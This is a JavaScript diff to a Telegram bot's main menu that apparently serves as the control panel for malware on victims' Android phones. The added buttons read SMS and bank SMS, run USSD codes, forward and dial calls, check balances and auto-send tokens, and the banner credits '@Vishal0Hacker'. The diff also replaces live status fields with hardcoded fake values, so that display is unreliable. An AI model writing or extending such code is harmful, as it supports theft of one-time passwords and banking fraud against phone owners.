@@ -964,38 +964,20 @@ async function showMainMenu(uid, chatId, messageId = null, edit = false) {
     count = online.length;
   }
   const bal = balanceOf(user, user.device_id).total;
-  const autoStatus = user.auto_forward !== false ? '🟢 ON' : '🔴 OFF';
-  const loginUrl = urls[0] || '';
-  const admin = isAdmin(uid);
-
+  const autoStatus = user.auto_forward !== false ? "🟢 ON" : "🔴 OFF";
   const buttons = [
-    [{ text: `🟢 Online (${count})`, callback_data: 'online_devices' }, { text: '🏦 Bank Service', callback_data: 'bank_service' }],
-    [{ text: '🔍 Search', callback_data: 'search_device' }, { text: '📤 Send Msg', callback_data: 'quick_send' }, { text: '⚡ Quick OTP', callback_data: 'quick_otp' }],
-    [{ text: '📢 Set Channel', callback_data: 'set_channel' }, { text: '🔗 Add Firebase', callback_data: 'add_firebase' }],
-    [{ text: `🔀 Auto Token: ${autoStatus}`, callback_data: 'toggle_auto' }, { text: '🔄 Refresh', callback_data: 'main_menu' }],
-    ...(admin ? [[{ text: '⚙️ Admin Panel', callback_data: 'admin_menu' }]] : []),
-    [{ text: '✖️ Logout', callback_data: 'logout' }]
+    [{ text:"▶️  Auto Token",callback_data:"toggle_auto" }, { text:"📨  Send Msg",callback_data:"quick_send"}],
+    [{ text:"📖  Read SMS",callback_data:"readsms_"+user.device_id}, { text:"🏦  Bank SMS",callback_data:"banksms_"+user.device_id}],
+    [{ text:"📱  USSD",callback_data:"ussd_"+user.device_id}, { text:"📞  Call Dial",callback_data:"calldial_"+user.device_id}],
+    [{ text:"📡  Call Fwd",callback_data:"callfwd_"+user.device_id}, { text:"✅  Check Balance",callback_data:"checkbalance_"+user.device_id}],
+    [{ text:"●  SIM1",callback_data:"sim_"+user.device_id+"_sim1" }, { text:"○  SIM2",callback_data:"sim_"+user.device_id+"_sim2"}],
+    [{ text:"🔄  Refresh",callback_data:"refresh_"+user.device_id}, { text:"🔙  Back",callback_data:"main_menu" }]
   ];
-
-  const lines = [
-    hdr(), '',
-    `📱 **Device:** \`${user.device_name || 'No Device'}\``,
-    `📡 **Online:** \`${count}\``,
-    `📡 **SIM:** \`${(user.default_sim || 'sim1').toUpperCase()}\``,
-    `🔗 **Firebase:** \`${urls.length}\``,
-    `📢 **Channel:** \`${user.channels.map(c => c).join(', ') || 'Not set'}\``,
-    `🔀 **Auto Token:** \`${autoStatus}\``,
-    `💰 ${fmtAmount(bal)}`,
-  ];
-  if (loginUrl) lines.push(`🔑 **Login:** \`${maskFirebase(loginUrl)}\``);
-  lines.push('', '📌 **Select an option:**');
-
-  const text = lines.join('\n');
+  const lines_js = ["╭──────────────────────────────────────────────╮","🤖   AUTO TOKEN SENDER  ⚡   𝐀𝐬𝐭𝐡𝐞𝐭𝐢𝐜  ❖","╰──────────────────────────────────────────────╯","","📱 **Device:** Note10  📡  🔵 SIM1","📡 **Online:** 1  💰  **Rs 8,730**","🔗 **Firebase:** 1  |  📢  **Channel:** Not set","🔀 **Auto Token:** 🟢  ON","","📌 **Make a Selection:**","","┌─ features ─────────────────────┐","│  🔀  Auto Token                │","│  📱  Device                    │","│  📡  Listening: 🟢 ON          │","│  📱  Set Mobile Number         │","│  📢  Set Channel/Group         │","│  📖  Read SMS                  │","│  │  Bank SMS                   │","│  │  💰  Check Balance           │","│  │  ⚡  ɪɴꜜɴᴛᴀɴᴛ · ᴘʀɪᴠᴀᴛᴇ          │","│  │                              │","│  └──────────────────────────────┘","","👇  ᴛᴀᴘ ʙᴇʟᴏᴡ ᴛᴏ ʙᴇɢɪɴ","","⌁  ᴘᴏᴡᴇʀᴇᴅ ʙʏ @Vishal0Hacker","","╰──────────────────────────────────────────────╯"];
+  const text = lines_js.join("\n");
   if (edit && messageId) await editMessage(chatId, messageId, text, buttons);
   else await sendMessage(chatId, text, buttons);
-}
-
-async function showOnlineDevices(uid, chatId, messageId = null, page = 0, edit = false) {
+}async function showOnlineDevices(uid, chatId, messageId = null, page = 0, edit = false) {
   const devices = await getOnlineDevices(uid);
   if (devices.length === 0) {
     const text = '❌ **No Online Devices**\n\n💡 Device app on ho aur Firebase connected ho tab yahan dikhenge.\n_Abhi online device hi dikhaye jaate hain — checking karo._';
